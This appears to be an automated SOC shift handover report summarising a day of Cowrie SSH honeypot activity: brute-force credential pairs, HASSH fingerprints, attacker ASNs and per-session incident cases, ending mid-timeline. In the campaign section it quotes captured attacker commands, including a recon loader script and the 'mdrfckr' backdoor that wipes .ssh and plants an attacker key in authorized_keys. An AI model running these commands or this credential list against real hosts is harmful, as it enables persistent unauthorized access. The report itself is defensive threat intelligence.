# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-01 |
| **Generated At** | 2026-08-01T13:37:01Z |
| **Shift Time** | 13:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **258** |
| Confirmed Threats | **232** |
| False Positives Filtered | **26** (10.1%) |
| Unique Attacker IPs | **115** |
| Countries of Origin | **27** |
| High Severity Cases | **161** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **97** |
| Malware Samples Analyzed | **4** HIGH · **26** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **196** |
| Unique Credential Pairs | **87** |
| Unique Usernames | **17** |
| Unique Passwords | **81** |
| Successful Auth Pairs | **167** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 117 |
| `unknown` | 13 |
| `guest` | 10 |
| `supervisor` | 10 |
| `support` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 9 |
| `support` | 7 |
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 7 |
| `admin` | `admin` | 7 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `` | 6 |
| `guest` | `qwerty12` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `unknown` | `unknown13` | `59.34.17.130` | 2026-08-01T09:01:13 |
| `unknown` | `unknown13` | `218.21.243.58` | 2026-08-01T09:01:22 |
| `root` | `111111` | `195.178.110.232` | 2026-08-01T09:02:28 |
| `root` | `123` | `195.178.110.232` | 2026-08-01T09:03:52 |
| `test` | `test222` | `177.174.105.113` | 2026-08-01T09:04:13 |
| `root` | `123123` | `195.178.110.232` | 2026-08-01T09:05:38 |
| `root` | `123321` | `195.178.110.232` | 2026-08-01T09:06:53 |
| `root` | `1234` | `195.178.110.232` | 2026-08-01T09:08:14 |
| `default` | `default99` | `60.214.127.246` | 2026-08-01T09:09:33 |
| `default` | `default99` | `203.252.10.3` | 2026-08-01T09:09:35 |
| `root` | `12345` | `195.178.110.232` | 2026-08-01T09:09:37 |
| `support` | `support` | `10.0.0.73` | 2026-08-01T09:11:17 |
| `unknown` | `444444` | `177.174.0.3` | 2026-08-01T09:11:20 |
| `root` | `1234567` | `195.178.110.232` | 2026-08-01T09:12:12 |
| `root` | `12345678` | `195.178.110.232` | 2026-08-01T09:13:24 |
| `root` | `123456789` | `195.178.110.232` | 2026-08-01T09:14:36 |
| `root` | `1234abcd` | `195.178.110.232` | 2026-08-01T09:15:52 |
| `root` | `123abc` | `195.178.110.232` | 2026-08-01T09:17:14 |
| `support` | `qwertyuiop` | `10.0.0.73` | 2026-08-01T09:17:51 |
| `root` | `123qwe` | `195.178.110.232` | 2026-08-01T09:18:34 |
| `support` | `qwertyuiop` | `130.185.96.113` | 2026-08-01T09:19:30 |
| `root` | `1q2w3e` | `195.178.110.232` | 2026-08-01T09:19:53 |
| `ec2-user` | `ec2user` | `51.75.141.245` | 2026-08-01T09:20:26 |
| `345gs5662d34` | `345gs5662d34` | `51.75.141.245` | 2026-08-01T09:20:28 |
| `ec2-user` | `3245gs5662d34` | `51.75.141.245` | 2026-08-01T09:20:29 |
| `root` | `1q2w3e4r` | `195.178.110.232` | 2026-08-01T09:21:13 |
| `root` | `1qaz2wsx` | `195.178.110.232` | 2026-08-01T09:22:34 |
| `root` | `321` | `195.178.110.232` | 2026-08-01T09:23:50 |
| `root` | `654321` | `195.178.110.232` | 2026-08-01T09:25:08 |
| `root` | `P@ssw0rd` | `195.178.110.232` | 2026-08-01T09:26:24 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-01T09:26:33 |
| `root` | `P@ssword` | `195.178.110.232` | 2026-08-01T09:27:35 |
| `root` | `---fuck_you----` | `124.70.190.197` | 2026-08-01T09:28:40 |
| `root` | `Root123` | `195.178.110.232` | 2026-08-01T09:28:49 |
| `root` | `admin` | `195.178.110.232` | 2026-08-01T09:29:59 |
| `root` | `admin123` | `195.178.110.232` | 2026-08-01T09:31:08 |
| `root` | `letmein` | `195.178.110.232` | 2026-08-01T09:32:20 |
| `root` | `pass` | `195.178.110.232` | 2026-08-01T09:33:25 |
| `root` | `passw0rd` | `195.178.110.232` | 2026-08-01T09:34:37 |
| `root` | `password` | `195.178.110.232` | 2026-08-01T09:35:51 |
| `root` | `password1` | `195.178.110.232` | 2026-08-01T09:37:06 |
| `root` | `qwerty` | `195.178.110.232` | 2026-08-01T09:38:22 |
| `default` | `default99` | `37.238.45.202` | 2026-08-01T09:39:11 |
| `default` | `default99` | `65.20.211.96` | 2026-08-01T09:39:25 |
| `root` | `r00t` | `195.178.110.232` | 2026-08-01T09:39:37 |
| `root` | `root!@#` | `195.178.110.232` | 2026-08-01T09:42:06 |
| `root` | `1234` | `20.227.140.178` | 2026-08-01T09:42:51 |
| `root` | `root#123` | `195.178.110.232` | 2026-08-01T09:43:21 |
| `root` | `88888888` | `112.194.142.167` | 2026-08-01T09:44:34 |
| `root` | `root0000` | `195.178.110.232` | 2026-08-01T09:44:34 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-01T09:44:38 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-01T09:44:38 |
| `root` | `88888888` | `112.168.1.182` | 2026-08-01T09:44:47 |
| `root` | `root1111` | `195.178.110.232` | 2026-08-01T09:45:48 |
| `debian` | `Password` | `36.135.62.103` | 2026-08-01T09:46:19 |
| `debian` | `Password` | `203.129.225.4` | 2026-08-01T09:46:32 |
| `root` | `root123` | `195.178.110.232` | 2026-08-01T09:46:57 |
| `root` | `12345` | `20.227.140.178` | 2026-08-01T09:47:10 |
| `root` | `root1234` | `195.178.110.232` | 2026-08-01T09:48:06 |
| `support` | `support` | `176.53.159.196` | 2026-08-01T09:48:32 |
| `root` | `root2024` | `195.178.110.232` | 2026-08-01T09:49:15 |
| `root` | `root2222` | `195.178.110.232` | 2026-08-01T09:50:28 |
| `root` | `root321` | `195.178.110.232` | 2026-08-01T09:51:43 |
| `root` | `root4444` | `195.178.110.232` | 2026-08-01T09:53:01 |
| `guest` | `qwerty12` | `10.0.0.73` | 2026-08-01T09:53:02 |
| `root` | `root5555` | `195.178.110.232` | 2026-08-01T09:54:18 |
| `guest` | `qwerty12` | `49.124.153.35` | 2026-08-01T09:54:47 |
| `guest` | `qwerty12` | `110.227.215.90` | 2026-08-01T09:54:56 |
| `root` | `root5678` | `195.178.110.232` | 2026-08-01T09:55:34 |
| `root` | `88888888` | `10.0.0.73` | 2026-08-01T09:56:32 |
| `root` | `root6666` | `195.178.110.232` | 2026-08-01T09:56:50 |
| `root` | `1234567` | `20.227.140.178` | 2026-08-01T10:00:36 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-01T10:02:53 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-01T10:02:55 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-01T10:03:04 |
| `cms` | `cms123` | `20.204.81.42` | 2026-08-01T10:03:39 |
| `345gs5662d34` | `345gs5662d34` | `20.204.81.42` | 2026-08-01T10:03:42 |
| `cms` | `3245gs5662d34` | `20.204.81.42` | 2026-08-01T10:03:44 |
| `guest` | `qwerty12` | `1.212.225.99` | 2026-08-01T10:11:25 |
| `root` | `123` | `20.227.140.178` | 2026-08-01T10:12:09 |
| `root` | `88888888` | `111.70.32.11` | 2026-08-01T10:14:18 |
| `nobody` | `nobody12345678` | `196.189.126.185` | 2026-08-01T10:21:12 |
| `nobody` | `nobody12345678` | `121.189.226.81` | 2026-08-01T10:21:29 |
| `nobody` | `nobody12345678` | `223.107.72.234` | 2026-08-01T10:21:38 |
| `mapserver` | `mapserver` | `20.192.5.254` | 2026-08-01T10:26:50 |
| `345gs5662d34` | `345gs5662d34` | `20.192.5.254` | 2026-08-01T10:26:56 |
| `mapserver` | `3245gs5662d34` | `20.192.5.254` | 2026-08-01T10:27:00 |
| `root` | `333` | `10.0.0.73` | 2026-08-01T10:28:02 |
| `root` | `333` | `36.135.62.103` | 2026-08-01T10:46:29 |
| `root` | `333` | `124.88.174.143` | 2026-08-01T10:46:38 |
| `root` | `Admin` | `65.181.79.60` | 2026-08-01T10:54:39 |
| `root` | `Admin` | `203.129.225.4` | 2026-08-01T10:54:48 |
| `supervisor` | `supervisor77` | `223.197.145.33` | 2026-08-01T10:56:09 |
| `supervisor` | `supervisor77` | `186.23.209.47` | 2026-08-01T10:56:22 |
| `supervisor` | `supervisor77` | `185.2.228.48` | 2026-08-01T10:56:22 |
| `blank` | `blank44` | `118.26.153.102` | 2026-08-01T11:04:47 |
| `blank` | `blank44` | `50.187.155.130` | 2026-08-01T11:05:00 |
| `root` | `Admin` | `10.0.0.73` | 2026-08-01T11:06:40 |
| `unknown` | `unknown1234` | `10.0.0.73` | 2026-08-01T11:12:09 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-01T11:22:01 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-01T11:22:01 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-01T11:22:08 |
| `root` | `Admin` | `201.63.52.54` | 2026-08-01T11:24:23 |
| `unknown` | `unknown1234` | `116.48.150.115` | 2026-08-01T11:31:17 |
| `unknown` | `unknown1234` | `89.253.90.113` | 2026-08-01T11:31:24 |
| `unknown` | `unknown1234` | `218.248.19.102` | 2026-08-01T11:31:33 |
| `root` | `console` | `154.83.15.101` | 2026-08-01T11:32:12 |
| `345gs5662d34` | `345gs5662d34` | `154.83.15.101` | 2026-08-01T11:32:15 |
| `root` | `3245gs5662d34` | `154.83.15.101` | 2026-08-01T11:32:17 |
| `hamza` | `1` | `181.188.148.74` | 2026-08-01T11:33:23 |
| `345gs5662d34` | `345gs5662d34` | `181.188.148.74` | 2026-08-01T11:33:27 |
| `hamza` | `3245gs5662d34` | `181.188.148.74` | 2026-08-01T11:33:28 |
| `admin` | `admin` | `8.137.167.190` | 2026-08-01T11:34:59 |
| `root` | `xH@123456` | `139.100.207.64` | 2026-08-01T11:35:42 |
| `345gs5662d34` | `345gs5662d34` | `139.100.207.64` | 2026-08-01T11:35:44 |
| `root` | `3245gs5662d34` | `139.100.207.64` | 2026-08-01T11:35:45 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-01T11:36:30 |
| `supervisor` | `444` | `10.0.0.73` | 2026-08-01T11:38:01 |
| `root` | `﻿------fuck------` | `118.145.154.96` | 2026-08-01T11:38:29 |
| `unknown` | `2222222222` | `10.0.0.73` | 2026-08-01T11:41:36 |
| `guest` | `guest13` | `10.0.0.73` | 2026-08-01T11:47:00 |
| `supervisor` | `444` | `121.165.8.169` | 2026-08-01T11:56:21 |
| `unknown` | `2222222222` | `14.99.61.248` | 2026-08-01T11:59:17 |
| `unknown` | `2222222222` | `85.30.248.213` | 2026-08-01T11:59:24 |
| `guest` | `guest13` | `223.25.108.2` | 2026-08-01T12:06:19 |
| `guest` | `guest13` | `61.12.84.172` | 2026-08-01T12:06:31 |
| `guest` | `guest13` | `107.135.117.245` | 2026-08-01T12:06:35 |
| `root` | `111111` | `195.178.110.227` | 2026-08-01T12:08:36 |
| `root` | `123` | `195.178.110.227` | 2026-08-01T12:10:20 |
| `root` | `123123` | `195.178.110.227` | 2026-08-01T12:12:06 |
| `root` | `123321` | `195.178.110.227` | 2026-08-01T12:13:49 |
| `supervisor` | `maintenance` | `116.72.9.151` | 2026-08-01T12:14:43 |
| `supervisor` | `maintenance` | `178.178.194.151` | 2026-08-01T12:14:52 |
| `root` | `1234` | `195.178.110.227` | 2026-08-01T12:15:29 |
| `root` | `﻿------fuck------` | `101.89.148.7` | 2026-08-01T12:16:03 |
| `operator` | `operator55` | `10.0.0.73` | 2026-08-01T12:16:55 |
| `root` | `12345` | `195.178.110.227` | 2026-08-01T12:17:10 |
| `root` | `1234567` | `195.178.110.227` | 2026-08-01T12:20:39 |
| `blank` | `blank77` | `10.0.0.73` | 2026-08-01T12:22:20 |
| `root` | `12345678` | `195.178.110.227` | 2026-08-01T12:22:24 |
| `root` | `123456789` | `195.178.110.227` | 2026-08-01T12:24:16 |
| `root` | `1234abcd` | `195.178.110.227` | 2026-08-01T12:26:03 |
| `root` | `123abc` | `195.178.110.227` | 2026-08-01T12:27:50 |
| `root` | `123qwe` | `195.178.110.227` | 2026-08-01T12:29:37 |
| `root` | `1q2w3e` | `195.178.110.227` | 2026-08-01T12:31:22 |
| `root` | `1q2w3e4r` | `195.178.110.227` | 2026-08-01T12:33:08 |
| `root` | `1qaz2wsx` | `195.178.110.227` | 2026-08-01T12:34:55 |
| `root` | `TkGqiCkpEF` | `8.134.196.84` | 2026-08-01T12:35:54 |
| `root` | `321` | `195.178.110.227` | 2026-08-01T12:36:43 |
| `root` | `654321` | `195.178.110.227` | 2026-08-01T12:38:34 |
| `supervisor` | `letmein` | `122.170.99.195` | 2026-08-01T12:39:42 |
| `supervisor` | `letmein` | `196.188.93.169` | 2026-08-01T12:39:49 |
| `root` | `P@ssw0rd` | `195.178.110.227` | 2026-08-01T12:40:31 |
| `blank` | `blank77` | `31.173.66.222` | 2026-08-01T12:41:18 |
| `blank` | `blank77` | `83.166.50.15` | 2026-08-01T12:41:25 |
| `root` | `P@ssword` | `195.178.110.227` | 2026-08-01T12:42:17 |
| `root` | `Root123` | `195.178.110.227` | 2026-08-01T12:43:59 |
| `root` | `admin` | `195.178.110.227` | 2026-08-01T12:45:45 |
| `root` | `admin123` | `195.178.110.227` | 2026-08-01T12:47:29 |
| `unknown` | `unknown123456789` | `10.0.0.73` | 2026-08-01T12:48:02 |
| `root` | `letmein` | `195.178.110.227` | 2026-08-01T12:49:13 |
| `unknown` | `unknown123456789` | `187.126.105.42` | 2026-08-01T12:49:36 |
| `unknown` | `unknown123456789` | `31.173.8.170` | 2026-08-01T12:49:48 |
| `root` | `pass` | `195.178.110.227` | 2026-08-01T12:50:59 |
| `root` | `passw0rd` | `195.178.110.227` | 2026-08-01T12:52:43 |
| `root` | `12345678` | `20.227.140.178` | 2026-08-01T12:53:23 |
| `root` | `password` | `195.178.110.227` | 2026-08-01T12:54:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **258** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 91 |
| OpenSSH | 53 |
| libssh | 31 |
| Paramiko (Python) | 10 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 71 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 49 | 47 |
| `f555226df196...` | Mirai/variant | 18 | 6 |
| `16443846184e...` | Generic scanner | 10 | 1 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 71 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 49 | 47 | Mirai/variant |
| `f555226df196...` | libssh | 18 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 12 | 4 | — |
| `16443846184e...` | Go SSH scanner | 10 | 1 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `9052c4ab4164...` | OpenSSH | 4 | 2 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 3 | 3 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 68 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.227`, `195.178.110.232`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `181.188.148.74`, `139.100.207.64`, `154.83.15.101`, `20.204.81.42`, `51.75.141.245`, `20.192.5.254`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **115** |
| Unique ASNs | **72** |
| High-Risk ASNs | **59** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 6 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS48090` | TECHOFF SRV LIMITED | 4 | HIGH |
| `AS25159` | PJSC MegaFon | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (161)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ccd806999ed6

| Field | Detail |
|---|---|
| **Source IP** | `59.34.17[.]130` |
| **First Seen** | 2026-08-01 09:01 |
| **Last Seen** | 2026-08-01 09:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:01:09` | `cowrie.session.connect` |
| `2026-08-01 09:01:11` | `cowrie.client.version` |
| `2026-08-01 09:01:11` | `cowrie.client.kex` |
| `2026-08-01 09:01:13` | `cowrie.login.success` |
| `2026-08-01 09:01:13` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.34.17[.]130` to AbuseIPDB if not already reported
- [ ] Block `59.34.17[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7add7e82b09

| Field | Detail |
|---|---|
| **Source IP** | `218.21.243[.]58` |
| **First Seen** | 2026-08-01 09:01 |
| **Last Seen** | 2026-08-01 09:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:01:19` | `cowrie.session.connect` |
| `2026-08-01 09:01:19` | `cowrie.client.version` |
| `2026-08-01 09:01:19` | `cowrie.client.kex` |
| `2026-08-01 09:01:22` | `cowrie.login.success` |
| `2026-08-01 09:01:22` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.243[.]58` to AbuseIPDB if not already reported
- [ ] Block `218.21.243[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a7105b946fc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:02 |
| **Last Seen** | 2026-08-01 09:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:02:26` | `cowrie.session.connect` |
| `2026-08-01 09:02:26` | `cowrie.client.version` |
| `2026-08-01 09:02:26` | `cowrie.client.kex` |
| `2026-08-01 09:02:28` | `cowrie.login.success` |
| `2026-08-01 09:02:29` | `cowrie.session.params` |
| `2026-08-01 09:02:29` | `cowrie.command.input` |
| `2026-08-01 09:02:29` | `cowrie.command.input` |
| `2026-08-01 09:02:29` | `cowrie.command.input` |
| `2026-08-01 09:02:29` | `cowrie.command.input` |
| `2026-08-01 09:02:29` | `cowrie.command.input` |
| `2026-08-01 09:02:29` | `cowrie.command.success` |
| `2026-08-01 09:02:29` | `cowrie.command.input` |
| `2026-08-01 09:02:29` | `cowrie.command.input` |
| `2026-08-01 09:02:29` | `cowrie.command.input` |
| `2026-08-01 09:02:29` | `cowrie.command.input` |
| `2026-08-01 09:02:29` | `cowrie.log.closed` |
| `2026-08-01 09:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd9ea782a6c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:03 |
| **Last Seen** | 2026-08-01 09:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:03:51` | `cowrie.session.connect` |
| `2026-08-01 09:03:51` | `cowrie.client.version` |
| `2026-08-01 09:03:51` | `cowrie.client.kex` |
| `2026-08-01 09:03:52` | `cowrie.login.success` |
| `2026-08-01 09:03:54` | `cowrie.session.params` |
| `2026-08-01 09:03:54` | `cowrie.command.input` |
| `2026-08-01 09:03:54` | `cowrie.command.input` |
| `2026-08-01 09:03:54` | `cowrie.command.input` |
| `2026-08-01 09:03:54` | `cowrie.command.input` |
| `2026-08-01 09:03:54` | `cowrie.command.input` |
| `2026-08-01 09:03:54` | `cowrie.command.success` |
| `2026-08-01 09:03:54` | `cowrie.command.input` |
| `2026-08-01 09:03:54` | `cowrie.command.input` |
| `2026-08-01 09:03:54` | `cowrie.command.input` |
| `2026-08-01 09:03:54` | `cowrie.command.input` |
| `2026-08-01 09:03:54` | `cowrie.log.closed` |
| `2026-08-01 09:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf7812b2f5cf

| Field | Detail |
|---|---|
| **Source IP** | `177.174.105[.]113` |
| **First Seen** | 2026-08-01 09:04 |
| **Last Seen** | 2026-08-01 09:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:04:10` | `cowrie.session.connect` |
| `2026-08-01 09:04:11` | `cowrie.client.version` |
| `2026-08-01 09:04:11` | `cowrie.client.kex` |
| `2026-08-01 09:04:13` | `cowrie.login.success` |
| `2026-08-01 09:04:14` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.105[.]113` to AbuseIPDB if not already reported
- [ ] Block `177.174.105[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f8c61b4d72b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:05 |
| **Last Seen** | 2026-08-01 09:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:05:36` | `cowrie.session.connect` |
| `2026-08-01 09:05:37` | `cowrie.client.version` |
| `2026-08-01 09:05:37` | `cowrie.client.kex` |
| `2026-08-01 09:05:38` | `cowrie.login.success` |
| `2026-08-01 09:05:39` | `cowrie.session.params` |
| `2026-08-01 09:05:39` | `cowrie.command.input` |
| `2026-08-01 09:05:39` | `cowrie.command.input` |
| `2026-08-01 09:05:39` | `cowrie.command.input` |
| `2026-08-01 09:05:39` | `cowrie.command.input` |
| `2026-08-01 09:05:39` | `cowrie.command.input` |
